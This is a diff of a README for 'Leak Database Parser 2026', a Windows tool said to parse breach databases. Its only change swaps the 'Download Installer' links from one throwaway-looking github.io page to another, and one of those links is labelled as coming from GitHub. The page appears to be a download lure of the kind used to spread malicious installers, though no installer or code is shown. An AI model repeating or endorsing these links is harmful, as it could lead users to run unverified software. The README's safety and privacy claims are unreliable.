@@ -2,7 +2,7 @@
 
 Leak Database Parser 2026 is an advanced tool designed for parsing and checking leak databases efficiently. This suite provides comprehensive features for data breach analysis and security checks on Windows 10 and 11 systems. Whether you're a security professional or a concerned user, this tool helps you stay informed about potential data leaks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -79,7 +79,7 @@ All data processing happens locally on your machine. Leak Database Parser does n
 
 Get the latest version of Leak Database Parser to enhance your security:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
